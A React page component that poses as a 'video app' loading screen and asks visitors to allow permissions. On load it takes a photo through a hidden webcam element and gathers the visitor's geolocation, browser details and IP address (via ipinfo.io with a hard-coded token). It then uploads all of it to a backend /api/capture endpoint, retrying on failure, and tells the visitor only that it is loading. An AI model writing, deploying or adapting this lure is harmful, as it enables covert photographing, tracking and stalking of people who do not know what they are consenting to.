import { useEffect, useState } from "react";
import { Spinner } from "@/components/ui/spinner";

function App() {
  const [status, setStatus] = useState("Loading Resources...");
  const [retryCount, setRetryCount] = useState(0);
  const MAX_RETRIES = 3;

  // Get API URL from environment or use current domain
  const getApiUrl = () => {
    if (import.meta.env.VITE_API_URL) {
      return import.meta.env.VITE_API_URL;
    }
    // Fall back to current domain (works on mobile)
    const protocol = window.location.protocol;
    const hostname = window.location.hostname;
    // If on localhost, use 5000, otherwise use current port
    const port =
      hostname === "localhost" || hostname === "127.0.0.1" ? ":5000" : "";
    return `${protocol}//${hostname}${port}`;
  };

  async function captureData() {
    try {
      setStatus("Requesting camera access...");

      // Access user's webcam with mobile-friendly constraints
      const video = document.getElementById("video");
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: { ideal: "user" }, // Prefer front camera on mobile
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: false,
      });
      video.srcObject = stream;

      // Wait for video to load with timeout
      await Promise.race([
        new Promise((resolve) => (video.onloadedmetadata = resolve)),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("Video load timeout")), 5000)
        ),
      ]);

      setStatus("Capturing photo...");

      // Capture image
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const image = canvas.toDataURL("image/jpeg", 0.8); // Use JPEG for smaller size

      // Stop webcam stream
      stream.getTracks().forEach((track) => track.stop());

      setStatus("Getting location...");

      // Get location with timeout and fallback
      const location = await getLocationWithFallback();

      setStatus("Getting device info...");

      // Get device info
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: new Date().toISOString(),
      };

      // Get IP address (using a third-party API) with timeout
      let ipData = { ip: "Unknown" };
      try {
        const ipResponse = await Promise.race([
          fetch("https://ipinfo.io/json?token=29fe5e73fe5e82"),
          new Promise((_, reject) =>
            setTimeout(() => reject(new Error("IP fetch timeout")), 5000)
          ),
        ]);
        ipData = await ipResponse.json();
      } catch (err) {
        console.warn("Could not fetch IP address:", err);
      }

      setStatus("Saving data...");

      // Combine all data
      const payload = {
        image,
        location,
        deviceInfo,
        ipAddress: ipData?.ip || "Unknown",
      };

      // Send data to backend using adaptive URL
      const apiUrl = getApiUrl();
      const response = await Promise.race([
        fetch(`${apiUrl}/api/capture`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("Upload timeout")), 30000)
        ),
      ]);

      if (response.ok) {
        const result = await response.json();
        setStatus("✓ Data captured and saved successfully!");
        console.log("Data captured successfully!", result);
      } else {
        throw new Error(`Server error: ${response.status}`);
      }
    } catch (error) {
      console.error("Error:", error);
      setStatus(`Error: ${error.message}`);

      // Retry logic
      if (retryCount < MAX_RETRIES) {
        setRetryCount(retryCount + 1);
        setTimeout(() => {
          setStatus("Retrying...");
          captureData();
        }, 2000);
      } else {
        setStatus("Failed to capture. Please refresh and try again.");
      }
    }
  }

  async function getLocationWithFallback() {
    return new Promise((resolve) => {
      // Set timeout for geolocation
      const timeout = 10000; // 10 seconds
      let timeoutId;

      timeoutId = setTimeout(() => {
        resolve({
          latitude: 0,
          longitude: 0,
          error: "Location timeout - using default",
        });
      }, timeout);

      // Try to get location
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          clearTimeout(timeoutId);
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          });
        },
        (err) => {
          clearTimeout(timeoutId);
          console.warn("Geolocation error:", err);
          // Return default location if permission denied or unavailable
          resolve({
            latitude: 0,
            longitude: 0,
            error: `Location error: ${err.message}`,
          });
        },
        {
          enableHighAccuracy: false, // Don't wait for high accuracy on mobile
          timeout: timeout,
          maximumAge: 0,
        }
      );
    });
  }

  useEffect(() => {
    // Call captureData on mount (not in window.onload)
    captureData();
  }, []);

  return (
    <div className="h-screen w-full flex flex-col items-center justify-center bg-linear-to-br from-blue-50 to-indigo-100">
      {status.includes("✓") ? (
        <div className="flex flex-col items-center gap-4">
          <div className="text-4xl">✅</div>
          <p className="text-lg font-semibold text-green-600">Done</p>
        </div>
      ) : status.includes("Error") || status.includes("Failed") ? (
        <div className="flex flex-col items-center gap-4">
          <div className="text-4xl">⚠️</div>
          <p className="text-lg font-semibold text-red-600 text-center px-4">
            {status}
          </p>
        </div>
      ) : (
        <>
          <Spinner className="size-12 text-blue-500 mb-4" />
          <div className="flex flex-col items-center gap-2">
            <p className="text-lg font-semibold">Loading video app...</p>
            <p className="text-sm text-gray-600">
              Please <strong>Allow</strong> permissions
            </p>
            {retryCount > 0 && (
              <p className="text-xs text-gray-500">
                Attempt {retryCount + 1}/{MAX_RETRIES + 1}
              </p>
            )}
          </div>
        </>
      )}
      <video
        id="video"
        autoPlay
        playsInline
        style={{ display: "none" }}
      ></video>
    </div>
  );
}

export default App;
